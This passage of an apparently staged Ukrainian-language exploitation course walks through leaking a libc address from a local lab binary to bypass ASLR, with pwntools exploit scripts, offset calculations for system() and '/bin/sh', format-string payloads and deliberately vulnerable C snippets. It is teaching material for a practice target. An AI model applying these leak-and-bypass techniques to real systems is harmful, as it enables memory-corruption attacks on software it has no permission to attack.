**–ö—Ä–æ–∫ 1: –ó–Ω–∞–π—Ç–∏ —è–∫–∏–π libc –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–æ–≥—Ä–∞–º–∞**
```bash
ldd ../build/stage07_leak_demo
```

**–í–∏–≤—ñ–¥:**
```
linux-vdso.so.1 (0x00007ffff7fc8000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a00000)
        ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                     –û—Å—å —Ü–µ–π —Ñ–∞–π–ª!
```

**–ö—Ä–æ–∫ 2: –í–∏—Ç—è–≥—Ç–∏ —Ç–∞–±–ª–∏—Ü—é —Å–∏–º–≤–æ–ª—ñ–≤**
```bash
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " puts@@"
```

**–ü–æ–≤–Ω–∏–π –≤–∏–≤—ñ–¥:**
```
  1317: 00000000000809c0   456 FUNC    GLOBAL DEFAULT   14 puts@@GLIBC_2.2.5
  ‚îÇ      ‚îÇ                  ‚îÇ   ‚îÇ       ‚îÇ       ‚îÇ        ‚îÇ  ‚îÇ
  ‚îÇ      ‚îÇ                  ‚îÇ   ‚îÇ       ‚îÇ       ‚îÇ        ‚îÇ  ‚îî‚îÄ –ù–∞–∑–≤–∞ + –≤–µ—Ä—Å—ñ—è
  ‚îÇ      ‚îÇ                  ‚îÇ   ‚îÇ       ‚îÇ       ‚îÇ        ‚îî‚îÄ –ù–æ–º–µ—Ä —Å–µ–∫—Ü—ñ—ó
  ‚îÇ      ‚îÇ                  ‚îÇ   ‚îÇ       ‚îÇ       ‚îî‚îÄ –í–∏–¥–∏–º—ñ—Å—Ç—å
  ‚îÇ      ‚îÇ                  ‚îÇ   ‚îÇ       ‚îî‚îÄ Binding (GLOBAL)
  ‚îÇ      ‚îÇ                  ‚îÇ   ‚îî‚îÄ –¢–∏–ø (FUNC = —Ñ—É–Ω–∫—Ü—ñ—è)
  ‚îÇ      ‚îÇ                  ‚îî‚îÄ –†–æ–∑–º—ñ—Ä (456 –±–∞–π—Ç)
  ‚îÇ      ‚îî‚îÄ VALUE (OFFSET) = 0x809c0  ‚óÑ‚îÄ‚îÄ –û–°–¨!
  ‚îî‚îÄ Symbol table entry number
```

**–£ Python:**
```python
offset_puts = 0x809c0  # Hex —á–∏—Å–ª–æ
```

**–ö—Ä–æ–∫ 3: –ó–Ω–∞–π—Ç–∏ —ñ–Ω—à—ñ –∫–æ—Ä–∏—Å–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó**
```bash
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -E " (puts|system|execve|open|read|write)@@"
```

### –ú–µ—Ç–æ–¥ 2: pwntools (–ù–ê–ô–ü–†–û–°–¢–Ü–®–ò–ô)

```python
from pwn import *

# –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ libc
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ offset'–∏
print(f"puts:   {hex(libc.symbols['puts'])}")
print(f"system: {hex(libc.symbols['system'])}")
print(f"execve: {hex(libc.symbols['execve'])}")
print(f"open:   {hex(libc.symbols['open'])}")

# –®—É–∫–∞—Ç–∏ —Ä—è–¥–∫–∏
binsh = next(libc.search(b'/bin/sh\x00'))
print(f"/bin/sh: {hex(binsh)}")
```

**–í–∏–≤—ñ–¥:**
```
puts:   0x809c0
system: 0x50d70
execve: 0xd5e50
open:   0x10dfc0
/bin/sh: 0x198e1a
```

### –ú–µ—Ç–æ–¥ 3: objdump (—Ä—É—á–Ω–∏–π —Å–ø–æ—Å—ñ–±)

```bash
objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep puts
```

**–í–∏–≤—ñ–¥:**
```
00000000000809c0 g    DF .text  00000000000001c8  GLIBC_2.2.5 puts
                ‚îî‚îÄ Offset
```

**–§–æ—Ä–º—É–ª–∏:**
```
leaked_puts = libc_base + offset_puts
‚Üí libc_base = leaked_puts - offset_puts

system_addr = libc_base + offset_system
```

## üíª –ê–Ω–∞–ª—ñ–∑ –∫–æ–¥—É —Å–µ—Ä–≤–µ—Ä–∞

```c
#define _GNU_SOURCE
#include <dlfcn.h>          // dlsym()
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(void){
    char cmd[64]={0};

    // –ß–∏—Ç–∞—î–º–æ –∫–æ–º–∞–Ω–¥—É
    read(0, cmd, sizeof(cmd)-1);

    // –Ø–∫—â–æ –∫–æ–º–∞–Ω–¥–∞ "LEAK"
    if(strncmp(cmd, "LEAK", 4)==0){
        // –û—Ç—Ä–∏–º—É—î–º–æ –†–ï–ê–õ–¨–ù–£ –∞–¥—Ä–µ—Å—É puts() –∑ libc
        void* p = dlsym(RTLD_NEXT, "puts");

        // –í–∏–≤–æ–¥–∏–º–æ –∞–¥—Ä–µ—Å—É
        dprintf(1, "PUTS=%p\n", p);
    }else{
        dprintf(1, "send LEAK\\n\n");
    }

    return 0;
}
```

### –©–æ —Ä–æ–±–∏—Ç—å dlsym?

```c
void* p = dlsym(RTLD_NEXT, "puts");
```

- `dlsym` - –¥–∏–Ω–∞–º—ñ—á–Ω–æ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å —Å–∏–º–≤–æ–ª (—Ñ—É–Ω–∫—Ü—ñ—é) –≤ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞—Ö
- `RTLD_NEXT` - —à—É–∫–∞—Ç–∏ –≤ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π –±—ñ–±–ª—ñ–æ—Ç–µ—Ü—ñ (libc)
- `"puts"` - —ñ–º'—è —Ñ—É–Ω–∫—Ü—ñ—ó
- –ü–æ–≤–µ—Ä—Ç–∞—î **—Ä–µ–∞–ª—å–Ω—É –∞–¥—Ä–µ—Å—É** `puts()` –≤ –ø–∞–º'—è—Ç—ñ –ø—Ä–æ—Ü–µ—Å—É

**–ü—Ä–∏–∫–ª–∞–¥ –≤–∏–≤–æ–¥—É:**
```
PUTS=0x7ffff7a809c0
```

–¶—è –∞–¥—Ä–µ—Å–∞ **—Ä–∞–Ω–¥–æ–º—ñ–∑–æ–≤–∞–Ω–∞** ASLR –ø—Ä–∏ –∫–æ–∂–Ω–æ–º—É –∑–∞–ø—É—Å–∫—É!

## üöÄ –ü–æ–∫—Ä–æ–∫–æ–≤–µ —Ä—ñ—à–µ–Ω–Ω—è

### –ö—Ä–æ–∫ 1: –ó–±—É–¥—É–π—Ç–µ –±—ñ–Ω–∞—Ä–Ω–∏–∫

```bash
cd stage07_leak_demo
./build.sh
```

### –ö—Ä–æ–∫ 2: –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç –∑ ASLR

–ó–∞–ø—É—Å—Ç—ñ—Ç—å –∫—ñ–ª—å–∫–∞ —Ä–∞–∑—ñ–≤ —ñ –ø–æ–¥–∏–≤—ñ—Ç—å—Å—è —è–∫ –∑–º—ñ–Ω—é—é—Ç—å—Å—è –∞–¥—Ä–µ—Å–∏:

```bash
for i in {1..5}; do
    echo "LEAK" | ../build/stage07_leak_demo
done
```

–í–∏–≤—ñ–¥:
```
PUTS=0x7ffff7a809c0
PUTS=0x7f8f912809c0
PUTS=0x7f12e34809c0
PUTS=0x7fa23bc809c0
PUTS=0x7f6789a809c0
```

–ë–∞—á–∏—Ç–µ? –ö–æ–∂–µ–Ω —Ä–∞–∑ **—Ä—ñ–∑–Ω–∞ –∞–¥—Ä–µ—Å–∞**!

### –ö—Ä–æ–∫ 3: –ó–Ω–∞–π–¥—ñ—Ç—å offset puts() –≤ libc

**–°–ø–æ—Å—ñ–± 1: –ß–µ—Ä–µ–∑ readelf**

–°–ø–æ—á–∞—Ç–∫—É –∑–Ω–∞–π–¥—ñ—Ç—å —è–∫–∞ libc –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è:
```bash
ldd ../build/stage07_leak_demo | grep libc
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

–ó–Ω–∞–π–¥—ñ—Ç—å offset puts:
```bash
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " puts@"
```

**–°–ø–æ—Å—ñ–± 2: –ß–µ—Ä–µ–∑ pwntools (–Ω–∞–π–∫—Ä–∞—â–∏–π)**

```python
from pwn import *

# –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î–º–æ —Ç—É —Å–∞–º—É libc —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–æ–≥—Ä–∞–º–∞
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# –û—Ç—Ä–∏–º—É—î–º–æ offset
puts_offset = libc.symbols['puts']
print(f"puts offset: {hex(puts_offset)}")
```

### –ö—Ä–æ–∫ 4: –°—Ç–≤–æ—Ä—ñ—Ç—å exploit

–§–∞–π–ª `exploit.py`:

```python
#!/usr/bin/env python3
from pwn import *

# –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è
context.log_level = 'info'

# –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î–º–æ –±—ñ–Ω–∞—Ä–Ω–∏–∫
elf = ELF('../build/stage07_leak_demo', checksec=False)

# –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î–º–æ libc (–¢–£ –°–ê–ú–£ —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–æ–≥—Ä–∞–º–∞!)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

log.info(f"Offset puts() –≤ libc: {hex(libc.symbols['puts'])}")
log.info(f"Offset system() –≤ libc: {hex(libc.symbols['system'])}")

# –ó–∞–ø—É—Å–∫–∞—î–º–æ –ø—Ä–æ—Ü–µ—Å
io = process('../build/stage07_leak_demo')

# –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –∫–æ–º–∞–Ω–¥—É LEAK
io.sendline(b'LEAK')

# –û—Ç—Ä–∏–º—É—î–º–æ –≤–∏—Ç—ñ–∫
response = io.recvline().decode().strip()
log.info(f"–í—ñ–¥–ø–æ–≤—ñ–¥—å —Å–µ—Ä–≤–µ—Ä–∞: {response}")

# –ü–∞—Ä—Å–∏–º–æ –∞–¥—Ä–µ—Å—É
leaked_puts = int(response.split('=')[1], 16)
log.success(f"–í–∏—Ç—ñ–∫: puts() = {hex(leaked_puts)}")

# –†–æ–∑—Ä–∞—Ö–æ–≤—É—î–º–æ –±–∞–∑—É libc
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")

# –¢–µ–ø–µ—Ä –º–∏ –∑–Ω–∞—î–º–æ –¥–µ –≤—Å—ñ —Ñ—É–Ω–∫—Ü—ñ—ó!
log.success(f"system() at: {hex(libc.symbols['system'])}")
log.success(f"'/bin/sh' at: {hex(next(libc.search(b'/bin/sh')))}")

io.close()
```

### –ö—Ä–æ–∫ 5: –ó–∞–ø—É—Å—Ç—ñ—Ç—å exploit

```bash
chmod +x exploit.py
python3 exploit.py
```

–û—á—ñ–∫—É–≤–∞–Ω–∏–π –≤–∏–≤—ñ–¥:
```
[*] Offset puts() –≤ libc: 0x809c0
[*] Offset system() –≤ libc: 0x50d70
[+] Starting local process
[*] –í—ñ–¥–ø–æ–≤—ñ–¥—å —Å–µ—Ä–≤–µ—Ä–∞: PUTS=0x7ffff7a809c0
[+] –í–∏—Ç—ñ–∫: puts() = 0x7ffff7a809c0
[+] Libc base: 0x7ffff7a00000
[+] system() at: 0x7ffff7a50d70
[+] '/bin/sh' at: 0x7ffff7b99e1a
```

## üîç –î–µ—Ç–∞–ª—å–Ω–∏–π —Ä–æ–∑–±—ñ—Ä

### –í—ñ–∑—É–∞–ª—ñ–∑–∞—Ü—ñ—è –ø—Ä–æ—Ü–µ—Å—É

**1. –ü—Ä–æ–≥—Ä–∞–º–∞ –∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è:**
```
ASLR —Ä–∞–Ω–¥–æ–º—ñ–∑—É—î –∞–¥—Ä–µ—Å–∏:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ –ü—Ä–æ–≥—Ä–∞–º–∞:   0x400000       ‚îÇ  ‚Üê PIE OFF, —Ñ—ñ–∫—Å–æ–≤–∞–Ω–∞
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Stack:      0x7fff...      ‚îÇ  ‚Üê –†–∞–Ω–¥–æ–º—ñ–∑–æ–≤–∞–Ω–∞
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ libc base:  0x7ffff7a00000 ‚îÇ  ‚Üê –†–ê–ù–î–û–ú–Ü–ó–û–í–ê–ù–ê!
‚îÇ   puts:     base + 0x809c0 ‚îÇ
‚îÇ   system:   base + 0x50d70 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**2. –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ LEAK:**
```
Client ‚Üí Server: "LEAK\n"
```

**3. dlsym –∑–Ω–∞—Ö–æ–¥–∏—Ç—å puts:**
```c
void* p = dlsym(RTLD_NEXT, "puts");
// p = 0x7ffff7a809c0 (—Ä–µ–∞–ª—å–Ω–∞ –∞–¥—Ä–µ—Å–∞ –≤ –ø–∞–º'—è—Ç—ñ)
```

**4. –°–µ—Ä–≤–µ—Ä –≤–∏–≤–æ–¥–∏—Ç—å:**
```
Server ‚Üí Client: "PUTS=0x7ffff7a809c0\n"
```

**5. –ú–∏ —Ä–æ–∑—Ä–∞—Ö–æ–≤—É—î–º–æ:**
```python
leaked_puts = 0x7ffff7a809c0
offset_puts = 0x809c0          # –ó —Ñ–∞–π–ª—É libc.so.6

libc_base = leaked_puts - offset_puts
          = 0x7ffff7a809c0 - 0x809c0
          = 0x7ffff7a00000

# –¢–µ–ø–µ—Ä –∑–Ω–∞—î–º–æ –¥–µ –≤—Å–µ:
system_addr = libc_base + 0x50d70
            = 0x7ffff7a00000 + 0x50d70
            = 0x7ffff7a50d70
```

### –ß–æ–º—É offset'–∏ —Ñ—ñ–∫—Å–æ–≤–∞–Ω—ñ?

Offset - —Ü–µ **–≤—ñ–¥—Å—Ç–∞–Ω—å** –≤—ñ–¥ –ø–æ—á–∞—Ç–∫—É —Ñ–∞–π–ª—É –¥–æ —Ñ—É–Ω–∫—Ü—ñ—ó. –í –æ–¥–Ω–æ–º—É —Ñ–∞–π–ª—ñ –≤–æ–Ω–∞ –∑–∞–≤–∂–¥–∏ –æ–¥–Ω–∞–∫–æ–≤–∞!

```bash
# –ü–æ–¥–∏–≤—ñ—Ç—å—Å—è –Ω–∞ offset –≤ —Ñ–∞–π–ª—ñ
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts

# –†–µ–∑—É–ª—å—Ç–∞—Ç:
# 1354: 00000000000809c0  456 FUNC GLOBAL DEFAULT 14 puts@@GLIBC_2.2.5
#                 ^^^^^^
#                 Offset (–∑–∞–≤–∂–¥–∏ –æ–¥–Ω–∞–∫–æ–≤–∏–π –¥–ª—è —Ü—å–æ–≥–æ —Ñ–∞–π–ª—É)
```

**–í–∞–∂–ª–∏–≤–æ:** –†—ñ–∑–Ω—ñ –≤–µ—Ä—Å—ñ—ó libc –º–∞—é—Ç—å **—Ä—ñ–∑–Ω—ñ offset'–∏**!

```
Ubuntu 20.04 libc:  puts @ 0x809c0
Ubuntu 22.04 libc:  puts @ 0x80ed0  ‚Üê –Ü–ù–®–ò–ô offset!
```

–¢–æ–º—É **–∫—Ä–∏—Ç–∏—á–Ω–æ –≤–∞–∂–ª–∏–≤–æ** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ç—É —Å–∞–º—É libc —â–æ –π –ø—Ä–æ–≥—Ä–∞–º–∞!

## üéì –ü—Ä–∞–∫—Ç–∏—á–Ω—ñ –∑–∞–≤–¥–∞–Ω–Ω—è

### –ó–∞–≤–¥–∞–Ω–Ω—è 1: –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ä—ñ–∑–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π

```python
#!/usr/bin/env python3
from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

# –í–∏—Ç—è–≥—É—î–º–æ leak
io = process('../build/stage07_leak_demo')
io.sendline(b'LEAK')
leaked = int(io.recvline().split(b'=')[1], 16)
io.close()

# –†–æ–∑—Ä–∞—Ö–æ–≤—É—î–º–æ –±–∞–∑—É
libc.address = leaked - libc.symbols['puts']

# –í–∏–≤–æ–¥–∏–º–æ –∞–¥—Ä–µ—Å–∏ –∫–æ—Ä–∏—Å–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π
functions = ['system', 'execve', 'open', 'read', 'write', 'mprotect']
for func in functions:
    try:
        addr = libc.symbols[func]
        print(f"{func:12} = {hex(addr)}")
    except:
        print(f"{func:12} = NOT FOUND")

# –®—É–∫–∞—î–º–æ —Ä—è–¥–∫–∏
strings = [b'/bin/sh', b'/bin/bash', b'sh']
for s in strings:
    try:
        addr = next(libc.search(s))
        print(f"{s.decode():12} = {hex(addr)}")
    except:
        print(f"{s.decode():12} = NOT FOUND")
```

### –ó–∞–≤–¥–∞–Ω–Ω—è 2: –í–∏—Ç—è–≥ libc –≤–µ—Ä—Å—ñ—ó

```python
#!/usr/bin/env python3
from pwn import *
import subprocess

# Leak –∞–¥—Ä–µ—Å–∏
io = process('../build/stage07_leak_demo')
io.sendline(b'LEAK')
leaked = int(io.recvline().split(b'=')[1], 16)
io.close()

print(f"[*] Leaked puts: {hex(leaked)}")

# –ó–Ω–∞–π–¥–µ–º–æ —è–∫–∞ libc
cmd = "ldd ../build/stage07_leak_demo | grep libc | awk '{print $3}'"
libc_path = subprocess.check_output(cmd, shell=True).decode().strip()
print(f"[*] Libc path: {libc_path}")

# –í–µ—Ä—Å—ñ—è libc
cmd = f"strings {libc_path} | grep 'GNU C Library'"
version = subprocess.check_output(cmd, shell=True).decode().strip()
print(f"[*] Libc version: {version}")
```

### –ó–∞–≤–¥–∞–Ω–Ω—è 3: Brute-force offset (—è–∫—â–æ libc –Ω–µ–≤—ñ–¥–æ–º–∞)

–Ø–∫—â–æ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ —Ç–æ—á–Ω–æ—ó libc, –∞–ª–µ –∑–Ω–∞—î—Ç–µ –≤–µ—Ä—Å—ñ—é –û–°:

```python
#!/usr/bin/env python3
from pwn import *

# Leak
io = process('../build/stage07_leak_demo')
io.sendline(b'LEAK')
leaked = int(io.recvline().split(b'=')[1], 16)
io.close()

# –û—Å—Ç–∞–Ω–Ω—ñ 3 hex —Ü–∏—Ñ—Ä–∏ –∑–∞–≤–∂–¥–∏ –æ–¥–Ω–∞–∫–æ–≤—ñ (–≤–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è)
last_digits = leaked & 0xfff
print(f"[*] Leaked puts: {hex(leaked)}")
print(f"[*] Last 3 digits: {hex(last_digits)}")

# –ú–æ–∂–ª–∏–≤—ñ offset –¥–ª—è —Ä—ñ–∑–Ω–∏—Ö libc (–ø—Ä–∏–∫–ª–∞–¥)
known_offsets = {
    'Ubuntu 20.04': 0x809c0,
    'Ubuntu 22.04': 0x80ed0,
    'Ubuntu 18.04': 0x6f690,
}

for name, offset in known_offsets.items():
    if (offset & 0xfff) == last_digits:
        base = leaked - offset
        print(f"[+] –ú–æ–∂–ª–∏–≤–æ {name}: base = {hex(base)}")
```

### –ó–∞–≤–¥–∞–Ω–Ω—è 4: Leak —á–µ—Ä–µ–∑ format string (–±–æ–Ω—É—Å)

–Ø–∫—â–æ –ø—Ä–æ–≥—Ä–∞–º–∞ –º–∞—î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å format string, –º–æ–∂–Ω–∞ –≤–∏—Ç—è–≥—Ç–∏ –∞–¥—Ä–µ—Å–∏ –∑—ñ —Å—Ç–µ–∫—É:

```c
// –í—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–¥
printf(user_input);  // ‚ùå –ú–∞—î –±—É—Ç–∏: printf("%s", user_input);
```

```python
# Exploit
payload = b'%3$p'  # –í–∏–≤–æ–¥–∏—Ç—å 3-–π –∞—Ä–≥—É–º–µ–Ω—Ç –∑—ñ —Å—Ç–µ–∫—É —è–∫ –ø–æ–∫–∞–∂—á–∏–∫
# –ú–æ–∂–Ω–∞ –≤–∏—Ç—è–≥—Ç–∏ saved RIP, –∞–¥—Ä–µ—Å–∏ libc, etc.
```

## üí° –¢–∏–ø–∏ –≤–∏—Ç–æ–∫—ñ–≤

### 1. –ü—Ä—è–º–∏–π –≤–∏—Ç—ñ–∫ (–Ω–∞—à –≤–∏–ø–∞–¥–æ–∫)

–ü—Ä–æ–≥—Ä–∞–º–∞ **—Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ** –≤–∏–≤–æ–¥–∏—Ç—å –∞–¥—Ä–µ—Å—É:
```c
printf("Address: %p\n", some_function);
```

### 2. Format string leak

```c
printf(user_controlled);  // –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å
// Payload: %p %p %p ...
```

### 3. Buffer over-read

```c
write(1, buffer, 100);  // –ê–ª–µ buffer —Ç—ñ–ª—å–∫–∏ 50 –±–∞–π—Ç
// –í–∏–≤–µ–¥–µ 50 –±–∞–π—Ç buffer + 50 –±–∞–π—Ç –∑–∞ –º–µ–∂–∞–º–∏ = leak
```

### 4. Use-after-free leak

```c
free(ptr);
printf("%p\n", ptr);  // ptr –≤–∫–∞–∑—É—î –Ω–∞ –∑–≤—ñ–ª—å–Ω–µ–Ω—É –ø–∞–º'—è—Ç—å –∑ –º–µ—Ç–∞–¥–∞–Ω–∏–º–∏ heap
```

### 5. GOT/PLT leak

```c
puts(puts);  // –í–∏–≤–æ–¥–∏—Ç—å –∞–¥—Ä–µ—Å—É —Å–∞–º–æ—ó puts() —á–µ—Ä–µ–∑ PLT/GOT
```

## üîê –ó–∞—Ö–∏—Å—Ç –≤—ñ–¥ –≤–∏—Ç–æ–∫—ñ–≤

### ASLR —Ä—ñ–≤–Ω—ñ

```bash
cat /proc/sys/kernel/randomize_va_space
```

- **0** = OFF (–≤—Å–µ —Ñ—ñ–∫—Å–æ–≤–∞–Ω–æ)
- **1** = Conservative (heap, stack, libraries)
- **2** = Full (–≤—Å–µ –≤–∫–ª—é—á–Ω–æ –∑ PIE)

### –Ü–Ω—à—ñ –∑–∞—Ö–∏—Å—Ç–∏

**PIE (Position Independent Executable):**
- –†–∞–Ω–¥–æ–º—ñ–∑—É—î **—Å–∞–º –±—ñ–Ω–∞—Ä–Ω–∏–∫**
- –ü–æ—Ç—Ä—ñ–±–µ–Ω leak –∞–¥—Ä–µ—Å–∏ –∑ –±—ñ–Ω–∞—Ä–Ω–∏–∫–∞

**ASLR:**
- –†–∞–Ω–¥–æ–º—ñ–∑—É—î **–±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, —Å—Ç–µ–∫, heap**
- –ü–æ—Ç—Ä—ñ–±–µ–Ω leak –∞–¥—Ä–µ—Å–∏ libc/stack

**Pointer encryption:**
- –î–µ—è–∫—ñ —Å–∏—Å—Ç–µ–º–∏ —à–∏—Ñ—Ä—É—é—Ç—å –ø–æ–∫–∞–∂—á–∏–∫–∏
- –£—Å–∫–ª–∞–¥–Ω—é—î –≤–∏—Ç—ñ–∫ –∫–æ—Ä–∏—Å–Ω–∏—Ö –∞–¥—Ä–µ—Å

## üìö –í–∞–∂–ª–∏–≤—ñ –Ω—é–∞–Ω—Å–∏

### 1. –í–µ—Ä—Å—ñ—è libc –∫—Ä–∏—Ç–∏—á–Ω–∞!

```python
# ‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–û - –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–ª–∏ —ñ–Ω—à—É libc
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')  # –Ü–Ω—à–∞ –≤–µ—Ä—Å—ñ—è!
leaked = 0x7ffff7a809c0
base = leaked - libc.symbols['puts']  # –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞ –±–∞–∑–∞!

# ‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û - –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–ª–∏ —Ç—É —Å–∞–º—É libc
ldd_output = subprocess.check_output(['ldd', './binary'])
libc_path = parse_libc_path(ldd_output)
libc = ELF(libc_path)
```

### 2. –í–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è –∞–¥—Ä–µ—Å

–ê–¥—Ä–µ—Å–∏ –≤ libc –∑–∞–≤–∂–¥–∏ –≤–∏—Ä—ñ–≤–Ω—è–Ω—ñ:
```
0x7ffff7a809c0  ‚Üê –ó–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è –Ω–∞ 0 (–≤–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è 16 –±–∞–π—Ç)
0x7ffff7a50d70  ‚Üê –¢–µ–∂
```

–û—Å—Ç–∞–Ω–Ω—ñ 3 hex —Ü–∏—Ñ—Ä–∏ **–ù–ï** –∑–º—ñ–Ω—é—é—Ç—å—Å—è ASLR!

### 3. –û–¥–∏–Ω leak = –≤—Å—è libc

–ó –æ–¥–Ω—ñ—î—ó –∞–¥—Ä–µ—Å–∏ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ **–≤—Å–µ**:
```python
leaked_any_function = ...
libc.address = leaked - libc.symbols['that_function']

# –¢–µ–ø–µ—Ä –¥–æ—Å—Ç—É–ø–Ω—ñ –≤—Å—ñ —Ñ—É–Ω–∫—Ü—ñ—ó:
system = libc.symbols['system']
execve = libc.symbols['execve']
binsh = next(libc.search(b'/bin/sh'))
```

## ‚úÖ –ß–µ–∫–ª–∏—Å—Ç –≤–∏–∫–æ–Ω–∞–Ω–Ω—è

- [ ] –ó—ñ–±—Ä–∞–Ω–æ –±—ñ–Ω–∞—Ä–Ω–∏–∫ —á–µ—Ä–µ–∑ `build.sh`
- [ ] –†–æ–∑—É–º—ñ—é —â–æ —Ç–∞–∫–µ ASLR —ñ —á–æ–º—É –≤—ñ–Ω –ø—Ä–æ–±–ª–µ–º–∞
- [ ] –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç—É–≤–∞–≤ –∑ –±–∞–≥–∞—Ç—å–º–∞ –∑–∞–ø—É—Å–∫–∞–º–∏ (–∞–¥—Ä–µ—Å–∏ —Ä—ñ–∑–Ω—ñ)
- [ ] –ó–Ω–∞–π—à–æ–≤ offset puts() –≤ libc
- [ ] –°—Ç–≤–æ—Ä–∏–≤ exploit —â–æ –≤–∏—Ç—è–≥—É—î leak
- [ ] –†–æ–∑—Ä–∞—Ö—É–≤–∞–≤ libc base –∑ leak
- [ ] –ó–Ω–∞–π—à–æ–≤ –∞–¥—Ä–µ—Å–∏ system() —Ç–∞ "/bin/sh"
- [ ] –†–æ–∑—É–º—ñ—é —á–æ–º—É offset'–∏ —Ñ—ñ–∫—Å–æ–≤–∞–Ω—ñ
- [ ] –ó–Ω–∞—é —â–æ libc –≤–µ—Ä—Å—ñ—è –∫—Ä–∏—Ç–∏—á–Ω–∞
- [ ] –ì–æ—Ç–æ–≤–∏–π –¥–æ Stage 08 (ret2libc –∑ ROP)!

---

**–ß–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è:** 25-35 —Ö–≤–∏–ª–∏–Ω
**–°–∫–ª–∞–¥–Ω—ñ—Å—Ç—å:** ‚≠ê‚≠ê‚≠ê‚òÜ‚òÜ (–°–µ—Ä–µ–¥–Ω—è)
**–ö–∞—Ç–µ–≥–æ—Ä—ñ—è:** PWN / Information Disclosure / ASLR Bypass
